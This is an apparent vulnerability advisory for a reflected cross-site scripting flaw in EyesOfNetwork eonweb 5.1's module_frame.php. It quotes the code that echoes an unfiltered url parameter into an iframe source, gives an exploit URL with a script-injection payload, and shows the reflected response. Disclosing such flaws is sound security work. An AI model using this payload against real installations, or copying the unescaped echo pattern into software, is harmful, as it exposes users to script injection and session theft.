@@ -1,0 +1,49 @@
+Eonweb_module_module_frame_module_frame.php cross-site scripting (XSS)
+Powered by shaojiejiang from 360 SkyEye Labs
+version: 5.1
+https://github.com/EyesOfNetworkCommunity/eonweb
+
+Vulnerability details
+
+# 0x01
+module/module_frame/module_frame.php Line 34
+
+$url=retrieve_form_data("url",null);
+
+?>
+
+<script>
+if (window !=top ) {top.location=window.location;}
+
+$(function() {
+	$(window).load(function() {
+		$('#page-wrapper').empty();
+        	$('<iframe>', {
+        	        src: '<?php echo urldecode($url); ?>',
+        	        id:  'iframe',
+        	        class: 'iframe',
+        	        frameborder: 0,
+        	}).appendTo('#page-wrapper');
+          
+url has not been filtered to cause cross-site scripting (XSS)
+
+EXP:
+https://192.168.227.169/module/module_frame/index.php?url=</script><script>alert(123)</script>
+
+
+the return page has the payload:
+
+
+
+<script>
+if (window !=top ) {top.location=window.location;}
+
+$(function() {
+	$(window).load(function() {
+		$('#page-wrapper').empty();
+        	$('<iframe>', {
+        	        src: '</script><script>alert(123)</script>',
+        	        id:  'iframe',
+        	        class: 'iframe',
+        	        frameborder: 0,
+        	}).appendTo('#page-wrapper');
